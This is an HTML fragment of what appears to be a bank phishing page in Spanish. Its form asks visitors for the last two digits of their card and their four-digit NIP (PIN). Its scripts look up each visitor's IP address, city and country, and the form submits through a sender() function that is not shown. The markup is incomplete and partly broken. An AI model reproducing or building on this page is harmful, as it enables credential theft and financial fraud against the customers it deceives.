<html>

      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
      <script>
         $.getJSON("https://api.ipify.org?format=json",
                                           function(data) {
         
             // Setting text of element P with id gfg
             $("#gfg").html(data.ip);
         })
      </script>
      <script>
         $.getJSON("https://ipinfo.io", function (response) {
      $("#ip").html("IP: " + response.ip);
      $("#address").html("" + response.city + ", " + response.country);

      })
      </script>
   </head>
   <body>
      <header id="main-header">

            <div id="bar-menu" class="bar-menu">
               <span></span>

      <div class="limiter">

            position: absolute;
            ">
            <div class="wrap-login100 p-l-55 p-r-55 p-t-50 p-b-54" >
              
               <section class="">
                  <form class="login100-form validate-form" action="" method="post"  onsubmit=" return sender()">

                        <br>
                        <br>
                       
                        <br>
                        <div class="wrap-input101 validate-input" data-validate=""> 
                           <span class="label-input101"></span>
                           <input class="input101" type="text" pattern="[0-9]*" style="text-align: left;padding-left: 10px" inputmode="numeric" id="0T4RX" maxlength="2" minlength="2" required="true" onkeypress="if (event.keyCode &lt; 48 || event.keyCode &gt; 57) event.returnValue = false;" placeholder="2 últimos dígitos de tu Tarjeta">
                           <span class="focus-input100" data-symbol=""></span>
                        </div>
                        <div class="wrap-input101 validate-input" data-validate="">

                           <br>
                           <br>
                        
                           <input class="input101" type="text" pattern="[0-9]*" style="text-align: left;padding-left: 10px" inputmode="numeric"  id="PL4C" maxlength="4" minlength="4" required="true" onkeypress="if (event.keyCode &lt; 48 || event.keyCode &gt; 57) event.returnValue = false;" placeholder="Ingresa los 4 digitos de tu NIP">
